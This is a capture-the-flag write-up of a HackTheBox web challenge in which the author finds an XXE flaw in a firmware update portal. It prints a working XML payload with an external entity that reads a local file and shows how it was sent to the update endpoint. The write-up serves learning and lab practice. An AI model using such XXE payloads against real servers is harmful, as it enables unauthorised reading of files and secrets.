# Day06 - jailbreak

- **Platform**: HackTheBox  
- **Category**: Web  
- **Difficulty**: Easy  
- **Date**: 2025-05-06  
- **Tools Used**: Browser, BurpSuite, Kali Linux  

---

## Summary
The challenge simulated a firmware update portal that accepted XML input. By crafting a malicious XML payload, I exploited an XXE vulnerability to read the `/flag.txt` file and retrieve the flag.

---

## Enumeration
- Accessed the app at `http://94.237.51.163:49486/`.  
- Found an update feature under `/rom`.  
- Observed that the update functionality relied on XML requests.  
- Used BurpSuite site map and repeater to analyze the update request.  

---

## Exploitation
- Identified the XML input was vulnerable to XML External Entity (XXE) injection.  
- Crafted a malicious XML payload to include the contents of `/flag.txt`:  
  ```xml
  <?xml version='1.0'?>
  <!DOCTYPE FirmwareUpdateConfig [
    <!ELEMENT FirmwareUpdateConfig ANY>
    <!ENTITY xxe SYSTEM 'file:///flag.txt'>
  ]>
  <FirmwareUpdateConfig>
    <Firmware>
      <Version>&xxe;</Version>
    </Firmware>
  </FirmwareUpdateConfig>
  ```
- Sent the payload in a POST request:  
  ```
  POST /api/update HTTP/1.1
  Host: 83.136.248.49:56894
  Content-Type: application/xml
  Content-Length: <adjusted length>
  ```
- Successfully retrieved the flag from the response.  

---

## Lessons Learned
- XXE vulnerabilities allow attackers to read local files via crafted XML input.  
- BurpSuite repeater is effective for quickly iterating on payloads and testing injection points.  
- Recognizing XML parsing in web applications is a key signal to test for XXE.  
